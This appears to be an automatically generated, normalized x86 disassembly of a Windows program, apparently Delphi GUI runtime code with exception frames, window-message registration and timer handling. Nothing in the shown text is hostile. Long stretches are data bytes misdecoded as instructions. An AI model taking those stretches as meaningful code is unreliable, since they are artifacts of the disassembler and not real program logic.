mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_425264
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42528c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4252d4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4252db
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_4030f8
call sub_424940
cmp [ rw-data ] 0x0
jg r-xdata
sub_4252fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425321
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425328
retn
sub_425334
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425359
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425360
retn
sub_42536c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425391
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425398
retn
sub_4253a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4253c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4253d0
retn
sub_4253dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425401
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425408
retn
sub_425414
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425439
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425440
retn
sub_42544c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425471
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425478
retn
sub_425484
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4254a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254b0
retn
sub_4254bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4254e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254e8
retn
sub_4255ff
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
dec edi
outsb
push ebx
push 0x5653776f
test dl dl
je r-xdata
outsd
outsb
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419cdc
mov [ esi + 0x30 ] 0x1
push esi
add esp 0xfffffff0
call sub_403404
push sub_42573c
call sub_41ad6c
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
js r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
hlt
sub_425643
push eax
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0600
push ebx
push 0x5653776f
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419cdc
mov [ esi + 0x30 ] 0x1
push esi
push sub_42573c
call sub_41ad6c
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4256a8
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d28
test bl bl
jle r-xdata
call sub_41ae04
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4256dc
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_454960
mov cl 0x1
sub_425704
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403330
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42573c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425766
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4257d4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_44b358
mov [ ebp - 0x14 ] eax
call sub_44b274
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_425897
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454250
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_425869
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425870
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4542ac
retn
sub_425870
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42589e
mov eax [ ebp - 0x14 ]
call sub_44b40c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_44b27c
retn
sub_425974
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408a2c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_425a0f
add [ edi ] cl
add [ eax ] al
add [ eax - 0x5bffb979 ] dl
xchg ebp eax
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + eax * 4 - 0x66d7ffba ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x64004687 ] cl
xchg ebp eax
add [ eax ] al
add [ ebx + 0x6f ] ah
insd
insd
insb
pop edi
inc esi
imul ebp [ esi + 0x64 ] 0x6c706552
popad
arpl [ ebp ] sp
push edi
outsb
push eax
jb r-xdata
inc esi
add [ edx + ebx * 4 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + eax * 4 + 0x46 ] dh
add [ eax + 0x4697 ] dh
add [ eax ] al
add [ eax - 0x79 ] dh
inc esi
add ah bl
cwde
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + eax * 4 + 0x46 ] ch
add al ah
xchg edi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x79 ] ch
inc esi
add [ ebx + ebx * 4 + 0x46 ] dl
add [ eax ] al
xor al 0x87
inc esi
add [ eax ] dl
xchg esi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] dh
xchg [ esi ] eax
mov eax 0x469a
add [ eax ] al
add [ edi + eax * 4 ] ch
inc esi
add [ ebx + ebx * 4 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xchg [ esi ] eax
dec eax
cwde
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_425b1a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
arpl [ eax + 0x74 ] dx
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b21
retn
cmp [ rw-data ] 0x0
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + eax * 4 - 0x652bffba ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x4c004687 ] al
cdq
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + eax * 4 + 0x46 ] bh
add [ eax + ebx * 4 + 0x46 ] dh
add [ eax ] al
js r-xdata
mov [ edi - 0x6a9bffba ] al
cmp [ cs : eax + 0x25 ] bl
cmp [ cs : eax ] bl
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404930
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_425b24
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c04
call sub_425974
mov eax [ r-xdata ]
call sub_413230
mov eax [ r-xdata ]
call sub_4132d0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41327c
sub_425b64
mov al 0x5b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
pop ebx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
pop ebx
inc edx
add al ch
pop ebx
inc edx
add [ eax + eax ] al
add al al
and al [ ecx ]
dec esp
movsb [ edi ] [ esi ]
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
pushfd
inc edx
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc ecx
add al bh
lahf
inc ecx
add [ ecx ] bh
inc ecx
add [ edx ] dh
inc ecx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ esp + 0x42 ] cl
add [ ecx ] al
add bh ch
dec [ esi ]
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x5bf49072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x425bb072
add [ ebx + 0x50041 ] bh
or [ ebp + 0x78 ] al
je r-xdata
dec ecx
outsb
je r-xdata
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
shr [ ecx + 0x42 ] 0x1
jb r-xdata
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
pop ebp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx * 2 + 0x5db40042 ] dl
inc edx
add [ edx + eax ] ah
add [ eax ] al
xchg esp eax
add [ edx ] 0x4c
movsb [ edi ] [ esi ]
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
or [ esi + 0x30900043 ] cl
inc eax
add [ eax + esi + 0x69d00040 ] ch
inc edx
insb
jae r-xdata
add eax 0xb6fffd00
inc [ eax + 0x6e ]
inc edx
add [ eax - 0x6bffbd92 ] al
outsb
inc edx
add [ esi + ebp * 2 + 0x6a1c0042 ] ch
inc edx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] dh
xchg [ ebx ] eax
hlt
inc ecx
add [ esp + ebp * 2 ] ch
inc edx
add [ eax + 0x3f ] ah
inc ebx
add [ eax + 0x6c ] al
inc edx
add [ eax + 0x48 ] bh
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax + 0x69 ] al
inc edx
add [ eax + edi * 4 - 0x4227ffbd ] bh
inc ebx
add [ edi * 4 + 0x3dd40043 ] ah
inc ebx
add [ eax ] bh
mov bl 0x43
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ esp + ecx * 4 + 0x6de40043 ] ah
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax - 0x6fffbd45 ] bl
jns r-xdata
inc ebx
add [ eax + eax * 2 ] ch
popad
insb
hlt
inc eax
add [ eax ] al
add bh bh
aam 0x65
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
call esp
inc edx
cmp al 0x33
je r-xdata
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
jmp esp
outsd
inc edi
jb r-xdata
add [ eax ] dh
xchg [ ebx ] eax
hlt
inc eax
add [ eax ] cl
mov es [ ebx ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
shr [ ecx + 0x42 ] 0x1
add [ eax - 0x2fffbc43 ] ch
test [ ebx ] eax
sub al 0x40
inc ecx
add [ esp + ebp * 2 ] ch
inc edx
add [ eax + 0x3f ] ah
inc ebx
add [ eax + 0x6c ] al
inc edx
add [ eax + 0x48 ] bh
inc ebx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax + 0x69 ] al
inc edx
add [ eax + edi * 4 - 0x4227ffbd ] bh
inc ebx
add [ edi * 4 + 0x3dd40043 ] ah
inc ebx
add [ eax ] bh
mov bl 0x43
add [ eax - 0x4d ] bl
inc ebx
add [ eax - 0x50 ] dh
inc ebx
add [ edi + 0x3d200043 ] bl
inc ebx
add [ ebp * 2 + 0x6d600043 ] dh
inc ebx
add [ eax + 0x48 ] ah
inc ebx
add [ eax - 0x13ffbcc2 ] bl
dec ecx
inc ebx
add [ ecx + ecx * 2 + 0x43 ] ah
add [ eax + 0x4c ] bh
inc ebx
add [ ebx + ecx * 2 ] ah
inc ebx
add [ esp + ecx * 4 + 0x6de40043 ] ah
inc ebx
add ah al
mov al 0x43
add [ eax + 0x7c0043b1 ] al
lodsb [ esi ]
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax - 0x6fffbd45 ] bl
jns r-xdata
inc ecx
add [ ebx + esi ] bh
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
int3
add [ eax ] al
push [ eax ]
jne r-xdata
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_41b2e8
jo r-xdata
jo r-xdata
and [ edi + 0x42 ] bl
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
inc eax
pop esi
inc edx
add al cl
pop ebp
inc edx
add [ edi ] ch
add [ eax ] cl
inc ebp
js r-xdata
add bh bh
xor [ ebx + eax * 2 ] cl
dec esp
dec esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add dh bh
mov ah 0x4b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7065646f
inc [ edx ]
nop
dec edx
inc ebx
add al al
popad
jo r-xdata
ror [ edx + 0x43 ] 0x0
movsb [ edi ] [ esi ]
push 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
inc ebx
je r-xdata
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
movsb [ edi ] [ esi ]
insb
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
dec edx
inc ebx
add [ edx + ebp * 2 + 0x43 ] ah
add [ eax - 0x80000000 ] al
push cs
add [ edi ] al
inc ebx
insb
jae r-xdata
add [ gs : eax ] dl
xor eax [ eax + ecx * 4 - 0x9 ]
inc edx
add [ edx ] bh
add bh bh
jpe r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ah
push 0x43
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
mov [ edi + 0x680041 ] dh
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
add [ ecx ] ah
add bh bh
in al 0x3d
inc ebx
add [ eax + 0x433e ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax + 0x5b0042f7 ] ah
add [ eax ] al
jmp [ edi + edi + 0x10043 ]
add [ 0x6d657449 ] al
adc [ eax ] al
sbb [ edx ] al
add bh bh
fsubr [ edx + eax * 2 ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
pop ss
add [ ecx ] cl
dec ecx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
call eax
mov bl 0x43
add ah dh
mov bl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
lodsb [ esi ]
push cs
inc ecx
add [ edi ] bl
add bh bh
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
inc [ edx ]
je r-xdata
add [ esi ] cl
insd
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
inc [ ebx + ecx * 2 + 0x4b940043 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
jae r-xdata
je r-xdata
jne r-xdata
add bh bh
jl r-xdata
inc ebx
outsb
je r-xdata
add al [ eax ]
[ eax + 0x6d ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050018 ] al
je r-xdata
sbb al [ ecx ]
adc al 0x2
add bh bh
pop eax
insd
add bh bh
test [ ebx + 0x43 ] cl
add [ ebx + ecx * 2 + 0x43 ] dl
add [ eax - 0x80000000 ] al
push ss
add [ esi + eax * 2 ] al
jb r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
push esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
sbb al 0x0
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
jo r-xdata
add [ eax ] eax
add [ eax ] al
jae r-xdata
insd
inc edx
inc [ edx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
mov al 0x49
inc ebx
add [ ebx + ebp * 2 ] ah
inc ebx
add [ eax ] al
jo r-xdata
adc [ eax ] al
0x4ff0000 0x434c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
outsd
outsb
jae r-xdata
add [ ebx ] cl
inc ebx
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
inc ebx
add [ eax + eax + 0x1fe00 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f090029 ] al
outsb
js r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
inc esp
mov ah 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
dec esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov esp 0x100434b
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
push ebx
je r-xdata
hlt
add al [ ebx ]
sbb [ ecx ] al
push eax
outsd
jo r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xf4656c62
adc [ eax ] al
push edi
add [ eax ] al
push [ eax + 0x24004349 ]
imul eax [ ebx ] 0x0
adc [ eax ] al
cdq
add [ eax ] al
jmp eax
mov ah 0x43
push 0x6948776f
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test eax 0xff0001
mov ah 0x43
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
add [ esp + esi * 4 + 0x10043 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
imul ebp [ esi + 0x74 ] r-xdata
sub al 0xb4
inc ebx
inc esi
xor al 0x8b
mov [ ebx + ebx * 8 - 0x2e17f08c ] 0xcf
std
jmp [ edi + ecx * 4 + 0x5 ]
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
pop ds
add [ esi ] cl
cmp [ eax + eax + 0x7c ] al
add [ eax ] al
dec [ eax + 0x4a ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090020 ] al
les ecx [ ebx + ecx * 4 ]
inc esp
outsd
arpl [ ebx + 0x78 ] bp
add al [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
dec edi
outsb
add [ edx ] cl
dec edi
outsb
inc esp
jb r-xdata
add al [ ebx ]
call 0xffffffffe9416331
add [ eax ] al
adc [ eax ] al
fimul [ ebx + 0x4046c6f0 ]
jb r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
mov eax esi
call sub_419d28
test bl bl
jle r-xdata
dec [ ebx - 0x31d7f2d ]
inc esp
jb r-xdata
cmovno eax [ eax ]
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ ebx + 0x96e8c6 ] cl
add [ eax ] al
mov eax [ esi + 0x34 ]
call sub_41aedc
mov edx ebx
and dl 0xfc
inc eax
lea eax [ bx + si ]
push ebx
push esi
test dl dl
je r-xdata
push ebx
je r-xdata
jb r-xdata
cmovno eax [ eax ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
inc esp
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070025 ] al
outsb
inc ebx
add [ ebx ] eax
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419cdc
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_4264d4
call sub_41ae28
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
outsb
inc ebp
outsb
je r-xdata
sub [ ebx ] 0x0
pop es
dec edi
cmovno eax [ eax ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x40 ] bp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
add al 0x43
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
add al [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
sub_42649c
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_426548
mov eax [ esi + 0x34 ]
call sub_41aedc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d28
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4264d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
